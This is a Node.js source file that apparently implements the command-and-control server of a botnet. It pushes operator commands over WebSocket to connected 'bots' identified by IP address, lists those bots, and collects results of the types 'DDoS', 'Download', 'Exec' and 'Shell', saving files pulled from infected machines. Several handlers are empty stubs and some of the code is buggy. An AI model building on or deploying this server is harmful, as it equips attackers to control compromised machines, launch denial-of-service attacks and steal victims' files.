const http = require('http');
const WebSocket = require('ws');

const { save_file } = require ('./results_handlers')
const { setup } = require ('./setup.js')

const port = 3000;
let clients = {};


const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/send-command') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const command = JSON.parse(body);
            // Push the command to all connected clients

            Object.keys(clients).forEach(key => {
                if (clients[key].readyState === WebSocket.OPEN && (command.objective === key || command.objective === 'All')) {
                    clients[key].send(JSON.stringify(command));
                }
            });

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
        });
    } else if (req.method === 'GET' && req.url === '/results') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const command = JSON.parse(body);
            //TODO devolver el archivo solicitado
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
        });
    } else if (req.method === 'GET' && req.url === '/bots') {

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ bots: Object.keys(clients) }));

    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress;

    console.log('New WebSocket connection from:', ip);

    clients[ip] = ws;
        ws.on('message', message => {
            const result = JSON.parse(message);
            switch (result.type) {
                case "DDoS":
                    break;
                case "Download":
                    console.log('Received result from client: ', ip);
                    save_file(result, ip)
                    break;

                case "Exec":
                    break;

                case "Shell":
                    break;

                default:
                    console.log("Comando no reconocido.")
                    break;
            }
            // Handle client result, e.g., store it in a database
        });

        ws.on('close', () => {
        clients = clients.filter(client => client !== ws);
    });
});

setup();
server.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
